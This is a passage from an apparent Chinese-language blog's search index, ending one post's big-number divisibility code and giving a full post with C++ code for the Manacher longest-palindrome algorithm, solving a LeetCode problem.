class="number">105</span>];</span><br><span class="line">    <span class="keyword">bool</span> flag;</span><br><span class="line">    <span class="keyword">while</span> (~<span class="built_in">scanf</span>(<span class="string">"%s%d"</span>, buff, &amp;l))&#123;</span><br><span class="line">        <span class="keyword">if</span> (l == <span class="number">0</span>)<span class="keyword">break</span>;</span><br><span class="line">        flag = <span class="literal">false</span>;</span><br><span class="line">        handle(num, len, buff);</span><br><span class="line">        <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; total &amp;&amp; prime[i] &lt; l; i++)&#123;</span><br><span class="line">            <span class="keyword">if</span> (checkModZero(num, len, prime[i]))&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"BAD %d\n"</span>, prime[i]);</span><br><span class="line">                flag = <span class="literal">true</span>;</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!flag)<span class="built_in">printf</span>(<span class="string">"GOOD\n"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>高精度</tag>
        <tag>模拟</tag>
      </tags>
  </entry>
  <entry>
    <title>马拉车算法模板</title>
    <url>/2021/03/04/%E9%A9%AC%E6%8B%89%E8%BD%A6%E7%AE%97%E6%B3%95%E6%A8%A1%E6%9D%BF/</url>
    <content><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>马拉车算法是Manacher算法，它是一位名叫Manacher的人在1975年提出的一种算法，用于在线性时间内解决回文串问题。<a id="more"></a></p>
<h2 id="实现"><a href="#实现" class="headerlink" title="实现"></a>实现</h2><p>忙活了一个晚上，终于把这个高效的算法掌握了，该算法时间复杂度为<code>O(N)</code>,空间复杂度也为<code>O(N)</code>。</p>
<p>哈哈哈哈哈哈哈，我目前还没有能够把它讲通，有兴趣的可以参考下面的链接进行理解。</p>
<p>参考链接：</p>
<ul>
<li><p><a href="https://www.zhihu.com/question/330983016" target="_blank" rel="noopener">怎么理解“马拉车“manacher算法？</a></p>
</li>
<li><p><a href="https://www.bilibili.com/video/BV1rE411x78x" target="_blank" rel="noopener">Manacher（马拉车）</a></p>
</li>
</ul>
<p>题目链接：<a href="https://leetcode-cn.com/problems/longest-palindromic-substring/" target="_blank" rel="noopener">LeetCode-最长回文子串</a></p>
<p><code>AC</code>代码</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Solution</span> &#123;</span></span><br><span class="line">   <span class="keyword">public</span>:</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">longestPalindrome</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123; <span class="keyword">return</span> manacher(s); &#125;</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">manacher</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="built_in">string</span> str = preProcess(s);</span><br><span class="line">        <span class="keyword">int</span> C = <span class="number">0</span>, R = <span class="number">0</span>, i_mirror, len = <span class="built_in">strlen</span>(str.c_str()), p[<span class="number">2003</span>];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            i_mirror = <span class="number">2</span> * C - i;</span><br><span class="line">            <span class="keyword">if</span> (i &lt; R) &#123;</span><br><span class="line">                <span class="comment">// 利用对称性，但是要防止超过右边界</span></span><br><span class="line">                p[i] = min(p[i_mirror], R - i);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                p[i] = <span class="number">1</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="comment">// 利用中心扩展法进行暴力</span></span><br><span class="line">            <span class="keyword">while</span> (str[i + p[i]] == str[i - p[i]]) p[i]++;</span><br><span class="line">            <span class="comment">// 判断是否需要更新 R</span></span><br><span class="line">            <span class="keyword">if</span> (i + p[i] &gt; R) &#123;</span><br><span class="line">                C = i;</span><br><span class="line">                R = i + p[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">// 找出最长回文串的长度并进行截取</span></span><br><span class="line">        <span class="keyword">int</span> maxLen = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">int</span> centerIndex = <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">1</span>; i &lt; len - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">if</span> (p[i] &gt; maxLen) &#123;</span><br><span class="line">                maxLen = p[i];</span><br><span class="line">                centerIndex = i;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">int</span> start = (centerIndex - maxLen) / <span class="number">2</span>;  <span class="comment">//原字符串下标</span></span><br><span class="line">        <span class="keyword">return</span> s.substr(start, maxLen - <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="function"><span class="built_in">string</span> <span class="title">preProcess</span><span class="params">(<span class="built_in">string</span> s)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> len = s.length(), j = <span class="number">0</span>;</span><br><span class="line">        <span class="function"><span class="built_in">string</span> <span class="title">t</span><span class="params">(<span class="number">2003</span>, <span class="string">'\0'</span>)</span></span>;</span><br><span class="line">        t[j++] = <span class="string">'^'</span>;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">            t[j++] = <span class="string">'#'</span>;</span><br><span class="line">            t[j++] = s[i];</span><br><span class="line">        &#125;</span><br><span class="line">        t[j++] = <span class="string">'#'</span>;</span><br><span class="line">        t[j++] = <span class="string">'$'</span>;</span><br><span class="line">        <span class="keyword">return</span> t;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>

]]></content>
      <categories>
        <category>算法</category>
      </categories>
      <tags>
        <tag>C</tag>
        <tag>字符串</tag>
      </tags>
  </entry>
</search>
